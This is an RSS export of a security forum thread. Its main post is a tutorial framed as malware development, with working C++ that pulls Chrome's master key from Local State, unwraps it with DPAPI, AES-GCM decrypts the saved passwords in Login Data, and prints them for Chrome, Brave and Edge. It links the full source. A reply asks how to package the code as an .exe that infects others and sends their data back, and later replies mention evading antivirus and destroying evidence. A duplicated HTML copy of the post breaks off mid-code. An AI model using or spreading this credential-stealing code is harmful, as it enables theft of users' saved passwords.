<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Malware Development 1 : Password Stealers (chrome)</title>
    <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571</link>
    <description># Introduction
---

In this article, I will discuss the encryption and decryption process of Chromium, and then I will provide some C++ code to retrieve encrypted passwords from a computer and decrypt them. First, I will give a brief overview of how the process works before moving on to the code.

Many malware programs have a module or functionality specifically designed to steal passwords and cookies and send that data back to a CnC server. In this article, we will focus primarily on the password decryption process used by these malwares. However, it&#39;s important to note that this process is essentially the same across all Chromium browsers version 80 or higher, and any encrypted data in Chrome can be decrypted using the same method.

# Overview
---

Previously, the Chrome process used the Windows Data Protection API (DPAPI) to encrypt all locally stored data on a Windows system. However, in newer versions of Chrome (version 80 or higher), the AES-GCM algorithm is now used to store sensitive data locally. The Windows Data Protection API is only used to encrypt the and derive symmetric key used by AES. Here&#39;s a brief overview of the entire process for Chrome:



- When a user chooses to save their password, Chrome generates a unique key for that password, which is then encrypted using the `CryptProtectData` function from DPAPI. 

 - Before the key is saved in the **Local State** file, the prefix &quot;DPAPI&quot; is inserted at the beginning of the key. 

```
&quot;encrypted_key&quot;:&quot;RFBBUEk.........Od5n&quot;
```
&quot;RFBBUEk&quot; is base64 decoded to DPAPI

- The master key is then encoded in base64 and stored in the **Local State** file.

- Sensitive data is encrypted using AES-GCM, which is authenticated encryption, meaning it provides both confidentiality and integrity of data.

- After the encryption process of user data, the data is then stored in a **Login Data** SQLite file in the **logins** table. Here are some of the fields of interest:

![image|631x146, 100%](upload://ppKN6rtATF4yVrBKxnYaF84ybrQ.png)



# Decryption
---
With the encryption process out of the way, here are some things we need to do to decrypt data/passwords:

1. Retrieve the master key from the **Local State** file.

2. Unprotect the master key. Remember, the initial process used `CryptProtectData`, so we will use `CryptUnprotectData`.

3. Implement a function for the AES-GCM decryption process.

4. Open an SQL connection to the **Login Data** file and retrieve the fields we want. In this case, the only encrypted field in the image above is the `password_value` field. 



# Implementation
---

### 1. Retrieve the master key

```cpp

DATA_BLOB* GetMasterKey(BROWSER browser)
{

	// Retrieveing the master key from the Local State File
	std::string localState = FileIO::GetLocalState(browser);
	std::string localStateData = FileIO::ReadFileToString(localState);
	std::string MasterString = ParseMasterString(localStateData);
	
	// Unprotect the master key.
	return UnportectMasterKey(MasterString);
}

```

I have a few pointers here regarding the FileIO namespace. It contains only a few functions, such as reading a file to a string, getting app data, and getting a database file. To keep things short, I won&#39;t include the code snippets here, but you can find everything in the GitHub link.

Also, I have a `ReadFileToString` function that reads the entire local state file and manually searches for the key with `PraseMasterString`. This is definitely not the best way to solve the problem, but it&#39;s simple enough to keep this example short. Realistically, we would want to use a small JSON library to parse the necessary data since it is more robust and reliable to do it that way.


### 2. Unprotect Master Key Function

```cpp

DATA_BLOB* UnportectMasterKey(std::string MasterString)
{
	std::vector&lt;unsigned char&gt; binaryKey;
	DWORD binaryKeySize = 0;


	// Decoding the base64 encoded string to binary data.
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, NULL, &amp;binaryKeySize, NULL, NULL))
	{
		std::cout&lt;&lt; &quot;CryptStringToBinaryA [1] : Failed to convert BASE64 private key. \n&quot;;
		return nullptr;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &amp;binaryKeySize, NULL, NULL))
	{
		std::cout&lt;&lt; &quot;CryptStringToBinaryA [2] : Failed to convert BASE64 private key. \n&quot;;
		return nullptr;
	}

	// Calling CryptUnprotectData to unprotect the master key.
	// Out DATA_BLOB will hold the key we need with its length.
	DATA_BLOB in;
	DATA_BLOB *out = new DATA_BLOB;
	in.pbData = binaryKey.data() + 5; // Remove DPAPI
	in.cbData = binaryKeySize - 5;

	if (!CryptUnprotectData(&amp;in, NULL, NULL, NULL, NULL, 0, out))
	{
		std::cout&lt;&lt; &quot;CryptUnprotectData [1] : Failed to convert BASE64 private key. \n&quot;;
		return nullptr;
	}
	return out;
}

```

As we know, the key was encoded with base64 and prepended with &quot;DPAPI&quot; during the initial encryption process. Therefore, a few things that we need to do in this function are to call the Windows function `CryptStringToBinaryA` with the `CRYPT_STRING_BASE64` to decode our string.

After that, we used `in.pbData = binaryKey.data() + 5`. The &quot;+5&quot; is used so that we can obtain only the data after the prepended &quot;DPAPI&quot; string. 


### 3. AES-GCM  Decryption


```cpp
std::string AESDecrypter(std::string EncryptedBlob, DATA_BLOB MasterKey)
{
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE hKey = 0;
	NTSTATUS status = 0;
	SIZE_T EncryptedBlobSize = EncryptedBlob.length();
	SIZE_T TagOffset = EncryptedBlobSize - 15;
	ULONG PlainTextSize = 0;

	std::vector&lt;BYTE&gt; CipherPass(EncryptedBlobSize); // hold the passwords ciphertext.
	std::vector&lt;BYTE&gt; PlainText;
	std::vector&lt;BYTE&gt; IV(IV_SIZE); // Will hold initial vector data.

	// Parse iv and password from the buffer using std::copy
	std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
	std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());

	// Open algorithm provider for decryption
	status = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; &quot;BCryptOpenAlgorithmProvider failed with status: &quot; &lt;&lt; status &lt;&lt; std::endl;
		return &quot;&quot;;
	}

	// Set chaining mode for decryption
	status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; &quot;BCryptSetProperty failed with status: &quot; &lt;&lt; status &lt;&lt; std::endl;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return &quot;&quot;;
	}

	// Generate symmetric key
	status = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; &quot;BcryptGenertaeSymmetricKey failed with status: &quot; &lt;&lt; status &lt;&lt; std::endl;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return &quot;&quot;;
	}

	// Auth cipher mode info
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
	TagOffset = TagOffset - 16;
	AuthInfo.pbNonce = IV.data();
	AuthInfo.cbNonce = IV_SIZE;
	AuthInfo.pbTag = CipherPass.data() + TagOffset;
	AuthInfo.cbTag = TAG_SIZE;

	// Get size of plaintext buffer
	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &amp;AuthInfo, NULL, 0, NULL, NULL, &amp;PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; &quot;BCryptDecrypt (1) failed with status: &quot; &lt;&lt; status &lt;&lt; std::endl;
		return &quot;&quot;;
	}

	// Allocate memory for the plaintext
	PlainText.resize(PlainTextSize);

	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &amp;AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &amp;PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; &quot;BCrypt Decrypt (2) failed with status: &quot; &lt;&lt; status &lt;&lt; std::endl;
		return &quot;&quot;;
	}

	// Close the algorithm handle
	BCryptCloseAlgorithmProvider(hAlgorithm, 0);

	return std::string(PlainText.begin(), PlainText.end());
}


```

This was a pretty complicated function to work on, mainly because Windows&#39; BCrypt documentation was all over the place, especially once you get into authenticated encryption.

Before you try to understand any of it, go ahead and do a quick read on AES encryption with the GCM mode. Here&#39;s a pretty nice [comment](https://crypto.stackexchange.com/a/18092) that sums it up.

A quick overview of what we&#39;re doing here:

- The encrypted password field contains important data we need for decryption.

- The first is a prepended &quot;v10&quot; string. I&#39;m not really sure what it is, but it&#39;s not important in our case, so I&#39;m assuming it&#39;s something that they can use as an identifier for older versions if they ever move to something different in the future.

- The third important piece is the IV. This is a random and unique 12-byte initial vector (IV), also called a nonce.

- Lastly, we have the authentication tag. The tag is an output of the encryption function and an input for the decryption function. It&#39;s used to make sure the data was not tampered with.

We extract the first IV with the first call to `copy`. We start added 3 because we want to skip the &quot;v10&quot; prefix and copy up to IV_SIZE + 3.

Similarly, with the second call to `copy`, we extract ciphertext starting from 15 to the end of the string. Why 15? Because the first &quot;v10&quot; string is 3 bytes plus the first IV 12 bytes equals 15.


After that, we make several calls to some BCrypt functions:

* `BCryptOpenAlgorithmProvider` initializes a handle to the Windows algorithm provider.

* `BCryptSetProperty` sets the properties of the algorithm we are using, so in this case, AES with GCM mode.
* `BCryptGenerateSymmetricKey` The most important step is generating/deriving the key from the master key.
* Initializing the AuthInfo struct with authentication data we need like IV (nonce), IV size, tag for authentication.
* Finally, with all that, we make two `BCryptDecrypt` calls. The first is to retrieve the size, and the second is to decrypt the data and store it in our vector.


### 4. Parsing the Database
---

All we have to do now is retrieve the data from the SQLite database **Login Data** and pass in the password to the AESdecrypterFunction.



```cpp
void DecryptPasswordFor(BROWSER browser)
{
	std::string DbPath = FileIO::GetDbPath(browser);
	DATA_BLOB* MasterKey = GetMasterKey(browser);

	sqlite3* db = nullptr;
	std::string selectQuery = &quot;SELECT origin_url, action_url, username_value, password_value FROM logins&quot;;
	sqlite3_stmt* selectStmt = nullptr;


	// Open the database file
	if (sqlite3_open(DbPath.c_str(), &amp;db) != SQLITE_OK) {
		std::cerr &lt;&lt; &quot;Failed to open database file: &quot; &lt;&lt; sqlite3_errmsg(db) &lt;&lt; std::endl;
		return;
	}

	// Prepare the SELECT statement
	if (sqlite3_prepare_v2(db, selectQuery.c_str(), -1, &amp;selectStmt, 0) != SQLITE_OK) {
		std::cerr &lt;&lt; &quot;Failed to prepare SELECT statement: &quot; &lt;&lt; sqlite3_errmsg(db) &lt;&lt; std::endl;
		return;
	}
	// Iterate over the rows of the logins table
	while (sqlite3_step(selectStmt) == SQLITE_ROW) {
		// Extract the values of the columns
		const char* website = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 0));
		const char* loginUrl = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 1));
		const char* userName = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 2));
		const char* passwordBlob = reinterpret_cast&lt;const char*&gt;(sqlite3_column_blob(selectStmt, 3));
		int passwordBlobSize = sqlite3_column_bytes(selectStmt, 3);

		if (passwordBlobSize &gt; 0) {
			// Decrypt the password
			std::string pass = AESDecrypter(passwordBlob, *MasterKey);
			// Print the login information
			std::cout &lt;&lt; &quot;Website: &quot; &lt;&lt; website &lt;&lt; std::endl;
			std::cout &lt;&lt; &quot;Login URL: &quot; &lt;&lt; loginUrl &lt;&lt; std::endl;
			std::cout &lt;&lt; &quot;User name: &quot; &lt;&lt; userName &lt;&lt; std::endl;
			std::cout &lt;&lt; &quot;Password: &quot; &lt;&lt; pass &lt;&lt; std::endl;
		}
		else {
			// Print a message if the password is empty
			std::cout &lt;&lt; &quot;No password found &quot; &lt;&lt; std::endl;
		}
	}

	delete MasterKey;
}

```

## Conclusion

In this post we went quickly went over the encryption and decryption process used by Chrome to store and protect sensitive user data such as passwords. The process involves generating a unique master key, which is then encrypted using the Windows Data Protection API (DPAPI) and stored in the Local State file. Sensitive data is then encrypted using the AES-GCM algorithm and stored in the Login Data SQLite file. To retrieve and decrypt the data, the master key must be retrieved and decrypted using CryptUnprotectData, and the password value must be decrypted using an AES-GCM decryption process. This process the decryption process is common amongst chromium browsers. 

But I wouldn&#39;t say the same for my other functions in FileIO.h lol, I did try it on 3 different browsers and it works but I believe other chromium browsers store database and local state files in different locations, so that&#39;s something to double check on.
 

I did experiment with on 3 different browsers and it works for those.

```cpp
int main() {


	std::cout &lt;&lt; &quot;CHROME\n\n&quot;;	
	DecryptPasswordFor(CHROME);
	std::cout &lt;&lt; &quot;\n\nBRAVE\n\n&quot;;
	DecryptPasswordFor(BRAVE);
	std::cout &lt;&lt; &quot;\n\nEDGE\n\n&quot;;
	DecryptPasswordFor(EDGE);
}
```

Here&#39;s the full output 

![image|539x500, 100%](upload://w6gDkJJx7zjNiaeSqaUYDtWV83w.png)


That&#39;s all for this post, if you have any questions, clarification, or improvements please let me know below. I&#39;m still in the learning process and would greatly appreciate the feedback.

Thx for reading :slight_smile:   
 
### [Source code link](https://github.com/EVIL-ACID/Malware-Development/tree/main/Malware101:Infostealers)</description>
    
    <lastBuildDate>Thu, 04 May 2023 18:32:28 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/20</link>
        <pubDate>Fri, 23 Jun 2023 19:43:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-20</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[dtv]]></dc:creator>
        <description><![CDATA[
            <p>Great writeup, thank you.</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/18</link>
        <pubDate>Mon, 24 Apr 2023 13:05:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-18</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[RiskLimit]]></dc:creator>
        <description><![CDATA[
            <p>So to sum up, people should use password managers instead of just saving it in a browser. There seems to be too many ways to log cookies or steal passwords.</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/17</link>
        <pubDate>Sun, 16 Apr 2023 10:46:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-17</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[Ryan-S]]></dc:creator>
        <description><![CDATA[
            <p>I thank you for the advice but i got it down finally it‚Äôs only been since halo 2 and halo 3 days using XR bots/booters and Bio bots &amp; the best Unix id say back then anyways. i just needed the refresher in front of me. now ill test on certain Anti-Virus and upgrade as needed then make my approach for ALL THE INTEL IN THE WORLD!!! and if you can manually find where the file is make sure is then malware inside which ill rename a idk some important .cmd task and just have it copied or written inside for window data base</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/14</link>
        <pubDate>Tue, 11 Apr 2023 23:28:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-14</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[whatsacomputer]]></dc:creator>
        <description><![CDATA[
            <p>Just made an account to say<br>
Good work! Straight forward explanation</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/12</link>
        <pubDate>Tue, 11 Apr 2023 01:47:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-12</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[Ryan-S]]></dc:creator>
        <description><![CDATA[
            <p>Of course not i just like learning about new techniques and like hands on action on learning about new ways to fight the malware and if i can see it and look through it ill be better prepared. and my High$$  VPN i use im sure will give me enough time to Force delete my entire labtop or burn it with gas lol<br>
or self deleting exe</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/11</link>
        <pubDate>Sun, 09 Apr 2023 16:10:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-11</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[Ryan-S]]></dc:creator>
        <description><![CDATA[
            <p>So is there anyway you can make this Password Steeler into a .exe file? and it be used as such to give the Password-Steeler.exe file to someone and they open it/click it and the malware now infected their P.C.? And will send information back to a log in my P.C. containing whatever they have been typing ETC ETC??? Let me know please and thank you.</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/9</link>
        <pubDate>Sat, 08 Apr 2023 23:07:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-9</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[n33ds0n]]></dc:creator>
        <description><![CDATA[
            <p>Cool, great Contentüëç</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/8</link>
        <pubDate>Fri, 07 Apr 2023 15:26:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-8</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[m0perandi]]></dc:creator>
        <description><![CDATA[
            <p>This is awesome information! Thank you for the wonderful content! &lt;3</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/6</link>
        <pubDate>Tue, 21 Mar 2023 11:24:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-6</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[EVIL-ACID]]></dc:creator>
        <description><![CDATA[
            <p>Thanks,</p>
<p>Looking forward to reading about ur project here. Hopefully u post something about it here tho <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/5</link>
        <pubDate>Mon, 27 Feb 2023 00:17:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-5</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>I‚Äôm slowly making a project for something else that‚Äôs Firefox / Chrome / Edge specific, this reminds me that I need to work on that lol.</p>
<p>Great job with this post! Didn‚Äôt even know that Chrome moved away from DPAPI keys.</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/3</link>
        <pubDate>Sun, 26 Feb 2023 00:13:08 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-3</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[theslycat]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for this. U kept it staright forward and sweat. Looking forward to seeing the next one.</p>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/2</link>
        <pubDate>Sat, 25 Feb 2023 04:30:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-2</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
      <item>
        <title>Malware Development 1 : Password Stealers (chrome)</title>
        <dc:creator><![CDATA[EVIL-ACID]]></dc:creator>
        <description><![CDATA[
            <h1>
<a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<hr>
<p>In this article, I will discuss the encryption and decryption process of Chromium, and then I will provide some C++ code to retrieve encrypted passwords from a computer and decrypt them. First, I will give a brief overview of how the process works before moving on to the code.</p>
<p>Many malware programs have a module or functionality specifically designed to steal passwords and cookies and send that data back to a CnC server. In this article, we will focus primarily on the password decryption process used by these malwares. However, it‚Äôs important to note that this process is essentially the same across all Chromium browsers version 80 or higher, and any encrypted data in Chrome can be decrypted using the same method.</p>
<h1>
<a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h1>
<hr>
<p>Previously, the Chrome process used the Windows Data Protection API (DPAPI) to encrypt all locally stored data on a Windows system. However, in newer versions of Chrome (version 80 or higher), the AES-GCM algorithm is now used to store sensitive data locally. The Windows Data Protection API is only used to encrypt the and derive symmetric key used by AES. Here‚Äôs a brief overview of the entire process for Chrome:</p>
<ul>
<li>
<p>When a user chooses to save their password, Chrome generates a unique key for that password, which is then encrypted using the <code>CryptProtectData</code> function from DPAPI.</p>
</li>
<li>
<p>Before the key is saved in the <strong>Local State</strong> file, the prefix ‚ÄúDPAPI‚Äù is inserted at the beginning of the key.</p>
</li>
</ul>
<pre><code class="lang-auto">"encrypted_key":"RFBBUEk.........Od5n"
</code></pre>
<p>‚ÄúRFBBUEk‚Äù is base64 decoded to DPAPI</p>
<ul>
<li>
<p>The master key is then encoded in base64 and stored in the <strong>Local State</strong> file.</p>
</li>
<li>
<p>Sensitive data is encrypted using AES-GCM, which is authenticated encryption, meaning it provides both confidentiality and integrity of data.</p>
</li>
<li>
<p>After the encryption process of user data, the data is then stored in a <strong>Login Data</strong> SQLite file in the <strong>logins</strong> table. Here are some of the fields of interest:</p>
</li>
</ul>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/2/b21fa57f598a7329913e5f477506f1458864975a.png" alt="image" data-base62-sha1="ppKN6rtATF4yVrBKxnYaF84ybrQ" width="631" height="146"></p>
<h1>
<a name="decryption-3" class="anchor" href="https://0x00sec.org#decryption-3"></a>Decryption</h1>
<hr>
<p>With the encryption process out of the way, here are some things we need to do to decrypt data/passwords:</p>
<ol>
<li>
<p>Retrieve the master key from the <strong>Local State</strong> file.</p>
</li>
<li>
<p>Unprotect the master key. Remember, the initial process used <code>CryptProtectData</code>, so we will use <code>CryptUnprotectData</code>.</p>
</li>
<li>
<p>Implement a function for the AES-GCM decryption process.</p>
</li>
<li>
<p>Open an SQL connection to the <strong>Login Data</strong> file and retrieve the fields we want. In this case, the only encrypted field in the image above is the <code>password_value</code> field.</p>
</li>
</ol>
<h1>
<a name="implementation-4" class="anchor" href="https://0x00sec.org#implementation-4"></a>Implementation</h1>
<hr>
<h3>
<a name="h-1-retrieve-the-master-key-5" class="anchor" href="https://0x00sec.org#h-1-retrieve-the-master-key-5"></a>1. Retrieve the master key</h3>
<pre><code class="lang-cpp">
DATA_BLOB* GetMasterKey(BROWSER browser)
{

	// Retrieveing the master key from the Local State File
	std::string localState = FileIO::GetLocalState(browser);
	std::string localStateData = FileIO::ReadFileToString(localState);
	std::string MasterString = ParseMasterString(localStateData);
	
	// Unprotect the master key.
	return UnportectMasterKey(MasterString);
}

</code></pre>
<p>I have a few pointers here regarding the FileIO namespace. It contains only a few functions, such as reading a file to a string, getting app data, and getting a database file. To keep things short, I won‚Äôt include the code snippets here, but you can find everything in the GitHub link.</p>
<p>Also, I have a <code>ReadFileToString</code> function that reads the entire local state file and manually searches for the key with <code>PraseMasterString</code>. This is definitely not the best way to solve the problem, but it‚Äôs simple enough to keep this example short. Realistically, we would want to use a small JSON library to parse the necessary data since it is more robust and reliable to do it that way.</p>
<h3>
<a name="h-2-unprotect-master-key-function-6" class="anchor" href="https://0x00sec.org#h-2-unprotect-master-key-function-6"></a>2. Unprotect Master Key Function</h3>
<pre><code class="lang-cpp">
DATA_BLOB* UnportectMasterKey(std::string MasterString)
{
	std::vector&lt;unsigned char&gt; binaryKey;
	DWORD binaryKeySize = 0;


	// Decoding the base64 encoded string to binary data.
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, NULL, &amp;binaryKeySize, NULL, NULL))
	{
		std::cout&lt;&lt; "CryptStringToBinaryA [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(MasterString.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &amp;binaryKeySize, NULL, NULL))
	{
		std::cout&lt;&lt; "CryptStringToBinaryA [2] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	// Calling CryptUnprotectData to unprotect the master key.
	// Out DATA_BLOB will hold the key we need with its length.
	DATA_BLOB in;
	DATA_BLOB *out = new DATA_BLOB;
	in.pbData = binaryKey.data() + 5; // Remove DPAPI
	in.cbData = binaryKeySize - 5;

	if (!CryptUnprotectData(&amp;in, NULL, NULL, NULL, NULL, 0, out))
	{
		std::cout&lt;&lt; "CryptUnprotectData [1] : Failed to convert BASE64 private key. \n";
		return nullptr;
	}
	return out;
}

</code></pre>
<p>As we know, the key was encoded with base64 and prepended with ‚ÄúDPAPI‚Äù during the initial encryption process. Therefore, a few things that we need to do in this function are to call the Windows function <code>CryptStringToBinaryA</code> with the <code>CRYPT_STRING_BASE64</code> to decode our string.</p>
<p>After that, we used <code>in.pbData = binaryKey.data() + 5</code>. The ‚Äú+5‚Äù is used so that we can obtain only the data after the prepended ‚ÄúDPAPI‚Äù string.</p>
<h3>
<a name="h-3-aes-gcm-decryption-7" class="anchor" href="https://0x00sec.org#h-3-aes-gcm-decryption-7"></a>3. AES-GCM  Decryption</h3>
<pre><code class="lang-cpp">std::string AESDecrypter(std::string EncryptedBlob, DATA_BLOB MasterKey)
{
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE hKey = 0;
	NTSTATUS status = 0;
	SIZE_T EncryptedBlobSize = EncryptedBlob.length();
	SIZE_T TagOffset = EncryptedBlobSize - 15;
	ULONG PlainTextSize = 0;

	std::vector&lt;BYTE&gt; CipherPass(EncryptedBlobSize); // hold the passwords ciphertext.
	std::vector&lt;BYTE&gt; PlainText;
	std::vector&lt;BYTE&gt; IV(IV_SIZE); // Will hold initial vector data.

	// Parse iv and password from the buffer using std::copy
	std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
	std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());

	// Open algorithm provider for decryption
	status = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BCryptOpenAlgorithmProvider failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		return "";
	}

	// Set chaining mode for decryption
	status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(status))
	{
